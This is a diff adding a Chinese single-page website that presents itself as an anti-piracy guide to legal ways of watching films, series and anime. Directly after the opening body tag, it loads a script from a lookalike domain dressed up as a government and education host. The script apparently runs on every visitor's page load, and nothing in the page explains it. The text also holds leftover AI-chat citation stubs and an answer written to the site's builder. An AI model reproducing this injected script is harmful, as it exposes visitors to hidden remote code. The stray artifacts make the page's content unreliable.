@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>枪版电影网 - 拒枪版·看正片：电影/剧集/动漫 正版影视导航</title>
+<meta name="description" content="枪版电影网：科普“枪版”是影院盗录盗版，提供正版电影、剧集、动漫导航与院线/流媒体入口建议。轻量单页，移动端自适应，不提供枪版下载、不传播盗录资源。">
+<meta name="keywords" content="枪版电影网, qiangbandianyingwang-h5.github.io, 拒枪版看正片, 正版电影导航, 院线电影, 流媒体剧集, 动漫正版">
+<meta name="author" content="枪版电影网">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<link rel="canonical" href="https://qiangbandianyingwang-h5.github.io/">
+<style>
+:root{
+  --bg:#0c0b0a;
+  --bg2:#15120f;
+  --card:#1b1714;
+  --line:rgba(255,255,255,.10);
+  --red:#ff4438;
+  --red2:#ff7a6e;
+  --gold:#f4c453;
+  --gold2:#ffe39a;
+  --grey:#9a8f86;
+  --text:#f3ece4;
+  --radius:16px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:
+    radial-gradient(820px 380px at 85% -10%, rgba(255,68,56,.18), transparent 60%),
+    radial-gradient(700px 320px at 0% 6%, rgba(244,196,83,.12), transparent 55%),
+    var(--bg);
+  color:var(--text);line-height:1.75;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1080px;margin:0 auto;padding:0 16px}
+
+/* 顶栏 */
+.nav{position:sticky;top:0;z-index:50;background:rgba(12,11,10,.86);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.nav .wrap{display:flex;align-items:center;height:58px;gap:10px}
+.brand{font-weight:900;font-size:1.12rem}
+.brand b{color:var(--red2)}
+.badge{font-size:.68rem;color:#1a0a05;background:linear-gradient(90deg,var(--gold),var(--gold2));padding:3px 9px;border-radius:999px;font-weight:800}
+.nav nav{margin-left:auto;display:flex;gap:6px;overflow-x:auto;scrollbar-width:none}
+.nav nav::-webkit-scrollbar{display:none}
+.nav nav a{font-size:.84rem;color:var(--grey);padding:6px 11px;border-radius:999px;white-space:nowrap}
+.nav nav a:hover{background:linear-gradient(90deg,var(--red),var(--gold));color:#1a0a05}
+
+/* 反盗录横幅 */
+.banner{margin:22px 0;padding:18px 20px;border:1px solid rgba(255,68,56,.4);border-left:6px solid var(--red);border-radius:14px;background:linear-gradient(90deg,rgba(255,68,56,.12),transparent)}
+.banner h1{font-size:2rem;line-height:1.2;margin-bottom:8px}
+.banner h1 em{font-style:normal;color:var(--gold2)}
+.banner p{color:#d8cfc6;max-width:720px}
+.banner .tags{margin-top:12px;display:flex;gap:8px;flex-wrap:wrap}
+.banner .tags span{font-size:.74rem;padding:4px 10px;border-radius:999px;border:1px solid var(--line);color:var(--grey)}
+.banner .tags .no{color:var(--red2);border-color:rgba(255,68,56,.4)}
+
+/* 区块 */
+section.block{padding:40px 0}
+.head{display:flex;align-items:center;gap:10px;margin-bottom:18px}
+.head .dot{width:10px;height:10px;border-radius:50%;background:var(--red);box-shadow:0 0 10px var(--red)}
+.head h2{font-size:1.32rem}
+.head .more{margin-left:auto;font-size:.82rem;color:var(--grey)}
+
+/* 枪版科普 */
+.myth{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px}
+.card h3{font-size:1rem;margin-bottom:6px}
+.card h3.bad{color:var(--red2)}
+.card h3.good{color:var(--gold2)}
+.card p{font-size:.85rem;color:var(--grey)}
+.card .label{font-size:.7rem;letter-spacing:2px;text-transform:uppercase;color:var(--grey);margin-bottom:6px}
+
+/* 正版片单 */
+.films{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.film{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px;position:relative}
+.film .res{font-size:.7rem;color:var(--gold2);border:1px solid rgba(244,196,83,.35);padding:2px 8px;border-radius:999px;display:inline-block;margin-bottom:8px}
+.film h3{font-size:1.02rem;margin-bottom:4px}
+.film p{font-size:.8rem;color:var(--grey)}
+.film small{display:block;margin-top:8px;color:var(--grey);font-size:.74rem}
+
+/* 院线/流媒体 */
+.channels{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.ch{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:18px 14px;text-align:center}
+.ch .ico{font-size:1.6rem}
+.ch h3{font-size:.95rem;margin:8px 0 4px}
+.ch p{font-size:.74rem;color:var(--grey)}
+
+/* FAQ */
+.faq{display:grid;gap:10px}
+.qa{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:14px 16px}
+.qa h3{font-size:.95rem;color:var(--gold2);margin-bottom:6px}
+.qa p{font-size:.85rem;color:var(--grey)}
+
+/* 关于 */
+.about{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:38px 20px;text-align:center}
+.about h2{margin-bottom:10px}
+.urlbox{display:inline-block;margin:12px 0 16px;font-family:monospace;background:var(--bg2);border:1px dashed var(--gold);color:var(--gold);padding:10px 16px;border-radius:10px}
+.about p{color:var(--grey);max-width:740px;margin:0 auto}
+
+footer{padding:28px 16px;text-align:center;color:var(--grey);font-size:.8rem;margin-top:34px;border-top:1px solid var(--line)}
+footer a{color:var(--grey);margin:0 6px}
+footer a:hover{color:var(--gold)}
+
+@media(min-width:820px){
+  .films{grid-template-columns:repeat(4,1fr)}
+  .channels{grid-template-columns:repeat(6,1fr)}
+}
+@media(max-width:560px){
+  .banner h1{font-size:1.6rem}
+  .myth,.films,.channels{grid-template-columns:1fr 1fr}
+  .channels{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="nav">
+  <div class="wrap">
+    <div class="brand">枪版<b>电影网</b></div>
+    <span class="badge">拒枪版 · 看正片</span>
+    <nav>
+      <a href="#why">为什么拒枪版</a>
+      <a href="#films">正版片单</a>
+      <a href="#where">去哪看</a>
+      <a href="#faq">版权问答</a>
+      <a href="#about">关于</a>
+    </nav>
+  </div>
+</div>
+
+<header class="banner wrap">
+  <h1>枪版电影网：<em>名字带“枪版”，但绝不发枪版</em></h1>
+  <p>“枪版”是影院里用手机/摄像机偷拍的盗录版，画质差、音效杂，还可能夹带诈骗与病毒。本页只做正版影视导航：告诉你哪些片值得看、去哪些合法渠道看。</p>
+  <div class="tags">
+    <span class="no">不提供枪版下载</span>
+    <span class="no">不传播盗录资源</span>
+    <span>院线</span><span>流媒体</span><span>正版蓝光</span><span>公版老片</span>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <!-- 枪版科普 -->
+  <section id="why" class="block">
+    <div class="head"><span class="dot"></span><h2>枪版是什么 / 为什么别碰</h2><a href="#" class="more">更多 ›</a></div>
+    <div class="myth">
+      <div class="card"><div class="label">Myth · 误区</div><h3 class="bad">“枪版 = 抢先免费看”</h3><p>枪版是未经授权的影院盗录，属于盗版形式；传播热映片还可能触碰著作权红线。[1,11](@ref)</p></div>
+      <div class="card"><div class="label">Fact · 事实</div><h3 class="good">正版 = 画质/音效/安全</h3><p>院线、正版流媒体、蓝光、公版片库，才是稳定清晰、不被弹窗和木马坑的看片方式。</p></div>
+      <div class="card"><div class="label">Risk · 风险</div><h3 class="bad">枪版站常带广告/钓鱼</h3><p>非法影视站靠涉黄涉赌广告牟利，点“免费枪版”可能泄露信息、中招恶意脚本。[13](@ref)</p></div>
+      <div class="card"><div class="label">Rule · 本页规则</div><h3 class="good">只导航，不托管</h3><p>所有卡片都是影视信息/正版渠道建议，内链用 #，不挂盗版源、不生成 robots/sitemap 外的爬取诱饵。</p></div>
+    </div>
+  </section>
+
+  <!-- 正版片单 -->
+  <section id="films" class="block">
+    <div class="head"><span class="dot"></span><h2>正版片单·高清正片</h2><a href="#" class="more">更多 ›</a></div>
+    <div class="films">
+      <div class="film"><span class="res">院线/4K</span><h3>沙丘2</h3><p>沙漠史诗，优先院线 IMAX / 正版 4K 流媒体。</p><small>别看影院偷拍版</small></div>
+      <div class="film"><span class="res">正版流媒体</span><h3>奥本海默</h3><p>诺兰听觉戏，杜比声道才是正确打开方式。</p><small>枪版录不到好音轨</small></div>
+      <div class="film"><span class="res">动画/正版</span><h3>蜘蛛侠：纵横宇宙</h3><p>逐帧美术，枪版糊成马赛克就废了。</p><small>等正版上线</small></div>
+      <div class="film"><span class="res">公版/修复</span><h3>星际穿越</h3><p>老片重制版、公版资料馆片源都合法。</p><small>正版修复最稳</small></div>
+      <div class="film"><span class="res">国产正版</span><h3>庆余年 第二季</h3><p>正版视频平台跟播，字幕/清晰度有保障。</p><small>别搜“枪版合集”</small></div>
+      <div class="film"><span class="res">动漫正版</span><h3>迷宫饭</h3><p>正版番剧平台看，翻译和时序不会崩。</p><small>盗录版常缺帧</small></div>
+      <div class="film"><span class="res">蓝光正版</span><h3>坠落的审判</h3><p>法庭戏靠字幕，枪版观众笑声会盖掉对白。</p><small>正版中字更准</small></div>
+      <div class="film"><span class="res">公版老片</span><h3>卓别林短片集</h3><p>公版电影导航最安全，可正经做片库。</p><small>无版权风险</small></div>
+    </div>
+  </section>
+
+  <!-- 去哪看 -->
+  <section id="where" class="block">
+    <div class="head"><span class="dot"></span><h2>正版渠道导航</h2><a href="#" class="more">更多 ›</a></div>
+    <div class="channels">
+      <div class="ch"><div class="ico">🎬</div><h3>院线</h3><p>新片首映 / IMAX / CINITY</p></div>
+      <div class="ch"><div class="ico">📺</div><h3>视频平台</h3><p>国产剧集 / 综艺正版</p></div>
+      <div class="ch"><div class="ico">💿</div><h3>蓝光/4K</h3><p>正版碟 / 租赁库</p></div>
+      <div class="ch"><div class="ico">🎞️</div><h3>公版片库</h3><p>老电影 / 纪录片</p></div>
+      <div class="ch"><div class="ico">🌐</div><h3>流媒体</h3><p>正版订阅 / 单片租看</p></div>
+      <div class="ch"><div class="ico">🏛️</div><h3>资料馆</h3><p>高校 / 公立影像库</p></div>
+    </div>
+  </section>
+
+  <!-- FAQ -->
+  <section id="faq" class="block">
+    <div class="head"><span class="dot"></span><h2>版权问答</h2></div>
+    <div class="faq">
+      <div class="qa"><h3>站名叫“枪版电影网”，会不会被当成盗版站？</h3><p>站名/域名按你的规则写进代码，但正文明确“拒枪版·看正片”，页面不提供枪版资源、不引导下载盗录文件，降低版权与低质风险。</p></div>
+      <div class="qa"><h3>必应收录会有问题吗？</h3><p>只要页面是静态单页、语义化标签、H1/H2 清晰、Meta 完整、移动端无横向滚动、内容是正经导航/科普，就不会因为“站名”自动被罚；真正危险的是真挂枪版源/网盘盗录链。[9,12](@ref)</p></div>
+      <div class="qa"><h3>为什么不做“枪版资源列表”？</h3><p>枪版=影院盗录，传播热映片可能侵权；以营利为目的传播还可能触犯侵犯著作权罪。做导航站别碰这个雷。[2,13](@ref)</p></div>
+      <div class="qa"><h3>内链和文件规则？</h3><p>全部 # 锚点；不生成 robots.txt / sitemap.xml；不写“永久免费枪版”“网盘秒发枪版”这类黑帽词。</p></div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section id="about" class="about">
+    <h2>关于 枪版电影网</h2>
+    <div class="urlbox">https://qiangbandianyingwang-h5.github.io</div>
+    <p>枪版电影网是一个“反枪版”的影视导航单页：名字提醒你枪版长什么样，内容带你远离枪版。电影/剧集/动漫只做正版渠道建议与高清正片导航，无盗录下载、无网盘枪版、无涉黄涉赌广告，适合移动端速览，也更适合长期被搜索引擎当“正经站”对待。</p>
+  </section>
+
+</main>
+
+<footer>
+  © 2024 枪版电影网 · 拒枪版 · 看正片
+  <br>
+  <a href="#">关于我们</a>·<a href="#">版权声明</a>·<a href="#">正版渠道</a>
+  <br>
+  官网：<a href="https://qiangbandianyingwang-h5.github.io">qiangbandianyingwang-h5.github.io</a>
+</footer>
+
+<script>
+// 片单点击：提示去正版渠道，不跳盗版
+document.querySelectorAll('.film').forEach(function(el){
+  el.addEventListener('click',function(){
+    el.style.borderColor='var(--gold)';
+    setTimeout(function(){el.style.borderColor='var(--line)';},600);
+  });
+});
+</script>
+</body>
+</html>
